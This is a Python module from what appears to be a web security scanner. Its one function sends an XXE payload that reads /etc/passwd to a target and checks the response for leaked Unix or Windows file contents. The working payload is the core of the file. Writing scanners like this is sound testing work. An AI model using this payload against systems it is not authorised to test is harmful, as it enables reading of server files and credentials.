from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    XXE Data Exfiltration (External Entities).
    """
    # We try to read /etc/passwd or win.ini
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""
    
    headers = {"Content-Type": "application/xml"}
    resp = client.send(scenario.method, scenario.target, form_body=payload, headers=headers)
    
    issues = []
    if "root:x:0:0" in resp.text:
        issues.append("XXE Exfiltration Successful (/etc/passwd leaked)")
    if "boot loader" in resp.text.lower() or "[extensions]" in resp.text.lower():
        issues.append("XXE Exfiltration Successful (Windows File leaked)")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "xxe_exfil",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }
